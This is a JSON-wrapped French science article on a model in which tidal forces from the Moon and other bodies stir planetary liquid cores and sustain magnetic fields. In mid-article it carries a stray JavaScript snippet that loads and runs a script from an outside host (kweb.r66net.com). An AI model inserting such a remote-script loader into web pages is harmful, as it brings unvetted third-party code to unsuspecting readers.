{"title": "Le champ magnétique terrestre peut dire merci à la Lune", "newspaper": "Futura Sciences", "author": "CNRS", "date_publi": "26/07/2017", "content": "Le champ magnétique des planètes est produit par des mouvements de convection dans le noyau liquide. Mais d'où vient donc l'énergie nécessaire au maintien de ces mouvements ? Réponse : des forces de marée, aussi bien en ce qui concerne la Terre que certaines lunes du Système solaire. Ce qu'il faut retenir Véritable bouclier contre les particules à hautes énergies, le champ magnétique d'une planète comme la Terre est produit par des mouvements de fer dans le noyau liquide. Le modèle dominant pour expliquer ce système s'accorde cependant mal avec les plus petits astres. Des chercheurs proposent un nouveau modèle dans lequel l'agitation du noyau liquide serait due aux marées produites par les interactions gravitationnelles entre les astres. Les scientifiques s'accordent à dire que la formation et le maintien des champs magnétiques résultent d'écoulements de  fer  dans le noyau  liquide . Les discussions se compliquent quand il s'agit de déterminer ce qui permet à ces  masses  colossales de se mouvoir. Le modèle dominant se base sur le lent refroidissement des  astres , qui entraîne une  convection , qui crée à son tour de grands  tourbillons  de fer fondu parallèles à l'axe de rotation du corps céleste. Or, les  petites planètes  et les  lunes  se refroidissent trop vite pour qu'un  champ magnétique  puisse encore s'y maintenir par convection, plusieurs milliards d'années après leur formation. Des chercheurs de l'Institut de recherche sur les phénomènes hors équilibre (IRPHE, CNRS, Aix-Marseille université, Centrale Marseille) et de l'université de Leeds (Royaume-Uni) ont donc présenté un modèle alternatif où ce sont les interactions gravitationnelles entre les astres qui agitent le noyau. On sait faire une simulation d'une parcelle cubique située au sein du noyau liquide d'une planète déformée par les effets de marées comme c'est le cas avec Europe, la lune de Jupiter. En concentrant leurs efforts numériques sur ce domaine réduit, les chercheurs ont accédé à des régimes proches des régimes planétaires. L'écoulement prend alors la forme d'une superposition d'ondes qui interagissent non-linéairement jusqu'à former une turbulence tridimensionnelle d'ondes inertielles (cf. champ de vorticité verticale au centre), en opposition aux modèles classiques où l'écoulement évolue vers des structures tourbillonnaires à plus grande échelle, alignées avec l'axe de rotation (cf. champ de vorticité verticale à droite). © Thomas Le Reun, Institut de recherche sur les phénomènes hors équilibre (IRPHE, CNRS, Aix-Marseille université, Centrale Marseille)                               Les marées déforment le noyau Les marées, produites par ces interactions gravitationnelles, déforment en effet le noyau périodiquement et amplifient les  mouvements  ondulatoires naturellement présents dans le fer liquide en rotation. Ce phénomène finit par produire un écoulement complètement turbulent, dont la nature n'est pas encore bien comprise. Afin de l'étudier, les chercheurs ont utilisé un modèle numérique d'une petite parcelle d'un noyau planétaire, plutôt qu'une simulation du noyau dans son ensemble, qui serait bien trop gourmande en puissance de calcul.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cette approche permet de caractériser finement les mouvements créés dans les régimes géophysiques extrêmes, tout en gardant les ingrédients  physiques  essentiels. Les chercheurs ont ainsi montré que la  turbulence  résulte d'une superposition d'un très grand nombre de mouvements ondulatoires qui échangent entre eux en permanence de l' énergie . Cet état particulier, appelé turbulence d'ondes, peut être vu comme un analogue en trois dimensions du mouvement de la surface de la mer, loin des côtes.  Ces travaux ouvrent la voie à de nouveaux modèles permettant de mieux comprendre et prédire les propriétés du champ magnétique des astres. Ce modèle de marées s'appliquerait à tous les corps en  orbite , suffisamment déformés par les  étoiles , planètes ou lunes voisines. Pour en savoir plus Les forces de marée activent le champ magnétique de la Lune Article du CNRS publié le 01/04/2016 Le  champ magnétique terrestre  nous protège chaque jour des particules chargées et des radiations issues du  rayonnement solaire . Mais comment a-t-il réussi à se maintenir jusqu'à aujourd'hui ? Selon le modèle classique, c'est grâce au  noyau terrestre , qui se serait refroidi d'environ 3.000 degrés au cours des derniers 4,3 milliards d'années. Cependant, une nouvelle étude suggère au contraire que la température au cœur de la  Terre  aurait baissé de seulement 300 degrés. L'action de la Lune, négligée jusqu'à présent, aurait alors compensé cette différence pour maintenir la géodynamo active. Le modèle classique de formation du champ magnétique terrestre soulevait un paradoxe majeur : pour que la géodynamo fonctionne, la Terre aurait dû être complètement fondue il y a quatre milliards d'années et son  noyau  aurait dû refroidir lentement, passant d'environ 6.800 °C à l'époque, à quelque 3.800 °C aujourd'hui.  Des travaux récents de  modélisation  de l'évolution précoce de la température interne de notre planète ont été menés, tout comme des études géochimiques sur la composition des  carbonatites  et des  basaltes  les plus anciens. Tous deux vont à l'encontre d'un tel refroidissement. Des températures aussi élevées sont donc exclues. D'ailleurs, l'équipe de chercheurs du CNRS et du laboratoire  Magmas  et  volcans , de l'université  Blaise Pascal , propose une autre source d'énergie dans une étude publiée dans la revue  Earth and Planetary Science Letters . Les effets gravitationnels associés à la présence de la Lune et du Soleil induisent sur Terre la déformation cyclique du manteau et des oscillations de l’axe de rotation. Ce forçage mécanique appliqué à toute la Planète induit de forts courants dans le noyau externe constitué d’un alliage de fer de très faible viscosité. Ces courants sont suffisants pour générer le champ magnétique terrestre. © Julien Monteux, Denis Andrault                               Un effet déjà vu ailleurs dans le Système solaire La  Terre  adopte une forme aplatie, tourne autour d'un axe incliné qui oscille autour des pôles et son manteau se déforme élastiquement par un effet de marée dû à la Lune. Les chercheurs ont montré que cet effet pourrait stimuler continuellement les mouvements de l' alliage  de fer liquide qui constitue le noyau externe, et générer en retour le  champ magnétique terrestre . Une puissance de 3.700 milliards de  watts  est constamment fournie à la Terre par transfert des énergies gravitationnelle et de rotation du système Terre-Lune-Soleil, et jusqu'à plus de 1.000 milliards de watts seraient disponibles pour provoquer ce type de mouvements dans le noyau externe. Cette énergie est suffisante pour générer le  champ magnétique terrestre  ce qui, avec la  Lune , résout le paradoxe majeur du modèle classique. Un tel effet des  forces gravitationnelles  sur le champ magnétique d'une planète est déjà amplement documenté pour  Io , Europe, deux satellites naturels de  Jupiter , et de nombreuses  exoplanètes . Puisque ni la rotation de la Terre autour de son axe, ni l'orientation de cet axe, ni l' orbite de la Lune  ne sont parfaitement régulières, leur influence cumulée sur les mouvements dans le noyau est instable et peut faire fluctuer la géodynamo. Ce phénomène permet d'expliquer certains pulses de  chaleur  dans le noyau externe et à sa frontière avec le  manteau terrestre . Historiquement, cela a pu conduire à des pics de  fusion  dans le manteau profond et à d'éventuels évènements volcaniques majeurs à la surface de la Terre. Ce nouveau modèle souligne que l'influence de la Lune sur la Terre dépasse donc largement le simple cas des marées. Le noyau de la Terre reconstitué en laboratoire                       En faisant tourner du sodium liquide autour d'une sphère de 23 tonnes, les géophysiciens de l'université du Maryland simulent les conditions qui règnent autour du noyau de notre Planète. But du jeu : comprendre pourquoi la Terre est la seule planète tellurique du Système solaire à posséder un champ magnétique important qui nous protège des colères du Soleil. Voici cette étonnante expérience en vidéo.                                       ", "theme": "planete"}